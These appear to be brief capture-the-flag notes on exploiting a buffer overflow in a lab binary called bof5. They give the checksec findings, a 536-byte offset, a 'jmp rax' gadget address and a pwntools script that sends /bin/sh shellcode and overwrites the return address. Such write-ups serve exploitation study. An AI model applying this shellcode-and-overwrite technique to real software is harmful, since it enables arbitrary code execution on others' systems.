- `file bof5` `checksec bof5`
  ![[bof5_JHT-1.png]]
- NX, PIE, canary off -> [[ret2shellcode]]
- decompile
  ![[bof5_JHT-2.png]]
- `vmmap` 
  ![[bof5_JHT-3.png]]
- `disas run`
  ![[bof5_JHT-4.png]]
- before ret to main(), mov rax = v2
  ![[bof5_JHT-5.png]]
- rsi/rax = command, rdx = count, rdi = file descriptor
- payload_1 = shellcode `system(/bin/sh)` = `asm(shellcraft.sh())`
- payload_2 = offset + jmp_rax
- offset: 536
  ![[bof5_JHT-6.png]]
- jmp_rax: `ROPgadget --binary bof5 | grep "jmp rax"` -> `0x000000000040110c`
  ![[bof5_JHT-7.png]]
- payload:
  ```python
	my_shellcode = asm(shellcraft.sh()) # alternative shellcode /bin/sh
	payload = my_shellcode.ljust(80, b'A')  # load shellcode and pad to buffer size
	p.sendafter(b'> ', payload)
	jump_rax = 0x000000000040110c
	payload1 = b'B'*536 + p64(jump_rax)
	p.sendafter(b'> ', payload1)
  ```